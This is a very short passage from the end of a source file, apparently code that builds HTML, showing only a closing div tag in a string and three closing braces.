</div>";
        }
    }
}